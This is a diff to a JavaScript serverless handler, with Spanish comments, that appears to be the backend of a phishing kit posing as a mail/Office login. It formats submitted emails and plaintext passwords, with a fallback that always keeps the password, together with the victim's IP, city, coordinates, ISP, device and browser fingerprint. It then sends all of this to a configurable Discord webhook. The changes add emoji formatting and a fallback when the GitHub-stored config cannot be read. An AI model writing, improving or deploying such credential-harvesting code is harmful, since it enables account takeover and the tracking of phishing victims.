@@ -1,5 +1,5 @@
 // API de Discord - Envía datos de login al webhook configurado
-// Usa ES modules (import/export) - Vercel los compila automáticamente
+// Usa ES modules (import/export) - Vercel compila automáticamente
 import { Buffer } from 'node:buffer';
 
 const GH_TOKEN = process.env.GH_TOKEN || '';
@@ -8,6 +8,13 @@ const GH_REPO = process.env.GH_REPO || 'mail-office-65';
 const CONFIG_PATH = 'config.json';
 const GITHUB_API = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${CONFIG_PATH}`;
 
+// Webhook por defecto: desde env var o vacío (configurable desde el admin panel)
+const DEFAULT_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
+const DEFAULT_CONFIG = {
+  discordWebhook: DEFAULT_WEBHOOK,
+  discordMessageTemplate: '',
+};
+
 const headers = {
   'Authorization': `token ${GH_TOKEN}`,
   'Accept': 'application/vnd.github.v3+json',
@@ -15,9 +22,16 @@ const headers = {
   'X-GitHub-Api-Version': '2022-11-28',
 };
 
+function canUseGithub() {
+  return GH_TOKEN && GH_TOKEN.length > 10;
+}
+
 async function githubRead() {
   const res = await fetch(GITHUB_API, { method: 'GET', headers });
-  if (!res.ok) throw new Error(`GitHub read error: ${res.status}`);
+  if (!res.ok) {
+    if (res.status === 404) return null;
+    throw new Error(`GitHub read error: ${res.status} ${res.statusText}`);
+  }
   const data = await res.json();
   return JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8'));
 }
@@ -27,41 +41,41 @@ function buildDefaultMessage(body, clientIp, timestamp) {
   var message = '';
   message += '🔐 Nuevo inicio de sesión';
   message += '\n──────────────────────────';
-  message += '\nUsuario: ' + (body.email || 'unknown');
-  message += '\nContraseña: ' + (body.password || '****');
-  message += '\nIP: ' + clientIp;
+  message += '\n👤 Usuario: ' + (body.email || 'unknown');
+  message += '\n🔑 Contraseña: ' + (body.password || '****');
+  message += '\n🌐 IP: ' + (clientIp || 'desconocida');
 
   // Geo IP con fallbacks
   var geoIp = body.geoIp || body.ipifyIp || clientIp;
-  message += '\nGeo IP: ' + (geoIp || 'desconocida');
-  message += '\nCiudad: ' + (body.geoCity || 'desconocida');
-  message += '\nRegión: ' + (body.geoRegion || 'desconocida');
-  message += '\nPaís: ' + (body.geoCountry || 'desconocida') + ' (' + (body.geoCountryCode || 'desconocido') + ')';
-  message += '\nISP: ' + (body.geoIsp || 'desconocida');
-  message += '\nLatitud: ' + (body.geoLatitude || 'desconocida');
-  message += '\nLongitud: ' + (body.geoLongitude || 'desconocida');
+  message += '\n📡 Geo IP: ' + (geoIp || 'desconocida');
+  message += '\n🏙️ Ciudad: ' + (body.geoCity || 'desconocida');
+  message += '\n📍 Región: ' + (body.geoRegion || 'desconocida');
+  message += '\n🌍 País: ' + (body.geoCountry || 'desconocida') + ' (' + (body.geoCountryCode || '') + ')';
+  message += '\n📡 ISP: ' + (body.geoIsp || 'desconocida');
+  message += '\n📍 Latitud: ' + (body.geoLatitude || 'desconocida');
+  message += '\n📍 Longitud: ' + (body.geoLongitude || 'desconocida');
 
   // Dispositivo
   message += '\n\n📱 Información del dispositivo:';
-  message += '\nMemoria RAM: ' + (body.deviceMemory || 'desconocida');
-  message += '\nCPU: ' + (body.cpuCores || 'desconocido') + ' núcleos';
-  message += '\nPuntos táctiles: ' + (body.touchPoints || 0);
-  message += '\nTipo: ' + (body.isMobile || 'No') + ' (Móvil) / ' + (body.isTablet || 'No') + ' (Tablet) / ' + (body.isDesktop || 'No') + ' (Escritorio)';
+  message += '\n🧠 Memoria RAM: ' + (body.deviceMemory || 'desconocida');
+  message += '\n💾 CPU: ' + (body.cpuCores || 'desconocido') + ' núcleos';
+  message += '\n👆 Puntos táctiles: ' + (body.touchPoints || 0);
+  message += '\n📱 Tipo: ' + (body.isMobile || 'No') + ' (Móvil) / ' + (body.isTablet || 'No') + ' (Tablet) / ' + (body.isDesktop || 'No') + ' (PC)';
 
   // Batería
-  message += '\nBatería: ' + (body.batteryLevel || 'No disponible') + ' (Cargando: ' + (body.batteryCharging || 'Desconocido') + ')';
+  message += '\n🔋 Batería: ' + (body.batteryLevel || 'No disponible') + ' (Cargando: ' + (body.batteryCharging || 'Desconocido') + ')';
 
   // Navegador
   message += '\n\n🌐 Navegador:';
   message += '\nUser Agent: ' + (body.userAgent || 'desconocido');
-  message += '\nIdioma: ' + (body.language || 'desconocido');
-  message += '\nPantalla: ' + (body.screenResolution || 'desconocida') + ' (' + (body.colorDepth || 'desconocida') + ')';
-  message += '\nZona horaria: ' + (body.timezone || 'desconocida');
-  message += '\nPlataforma: ' + (body.platform || 'desconocida');
-  message += '\nEstado online: ' + (body.onlineStatus || 'desconocido');
-  message += '\nCookies: ' + (body.cookiesEnabled || 'desconocido');
+  message += '\n🗣️ Idioma: ' + (body.language || 'desconocido');
+  message += '\n🖥️ Resolución: ' + (body.screenResolution || 'desconocida') + ' (' + (body.colorDepth || 'desconocida') + ')';
+  message += '\n⏰ Zona horaria: ' + (body.timezone || 'desconocida');
+  message += '\n💻 Plataforma: ' + (body.platform || 'desconocida');
+  message += '\n📶 Estado online: ' + (body.onlineStatus || 'desconocido');
+  message += '\n🍪 Cookies: ' + (body.cookiesEnabled || 'desconocido');
   message += '\n──────────────────────────';
-  message += '\nHora: ' + timestamp;
+  message += '\n⏰ Hora: ' + timestamp;
 
   return message;
 }
@@ -115,13 +129,15 @@ export default async function handler(req, res) {
   }
 
   try {
-    // Leer configuración desde GitHub
-    var config = {};
-    try {
-      config = await githubRead();
-    } catch (e) {
-      console.error('GitHub config read failed:', e);
-      return res.status(500).json({ error: 'No se pudo leer la configuración del servidor' });
+    // Leer configuración (GitHub o defaults)
+    var config = { ...DEFAULT_CONFIG };
+    if (canUseGithub()) {
+      try {
+        var ghConfig = await githubRead();
+        if (ghConfig) config = { ...DEFAULT_CONFIG, ...ghConfig };
+      } catch (e) {
+        console.error('GitHub config read failed:', e);
+      }
     }
 
     var webhookUrl = config.discordWebhook;
@@ -151,17 +167,17 @@ export default async function handler(req, res) {
 
     // Fallback: asegurar que la contraseña siempre esté incluida
     if (message.indexOf(password) === -1 && password !== '****') {
-      message += '\nContraseña: ' + password;
+      message += '\n🔑 Contraseña: ' + password;
     }
 
     // Fallback: asegurar que la ubicación siempre esté incluida
-    if (message.indexOf('Ciudad:') === -1) {
-      message += '\nCiudad: ' + (body.geoCity || 'desconocida');
-      message += '\nRegión: ' + (body.geoRegion || 'desconocida');
-      message += '\nPaís: ' + (body.geoCountry || 'desconocida') + ' (' + (body.geoCountryCode || '') + ')';
-      message += '\nISP: ' + (body.geoIsp || 'desconocida');
-      message += '\nLatitud: ' + (body.geoLatitude || 'desconocida');
-      message += '\nLongitud: ' + (body.geoLongitude || 'desconocida');
+    if (message.indexOf('🏙️ Ciudad:') === -1) {
+      message += '\n🏙️ Ciudad: ' + (body.geoCity || 'desconocida');
+      message += '\n📍 Región: ' + (body.geoRegion || 'desconocida');
+      message += '\n🌍 País: ' + (body.geoCountry || 'desconocida') + ' (' + (body.geoCountryCode || '') + ')';
+      message += '\n📡 ISP: ' + (body.geoIsp || 'desconocida');
+      message += '\n📍 Latitud: ' + (body.geoLatitude || 'desconocida');
+      message += '\n📍 Longitud: ' + (body.geoLongitude || 'desconocida');
     }
 
     // Enviar al webhook de Discord
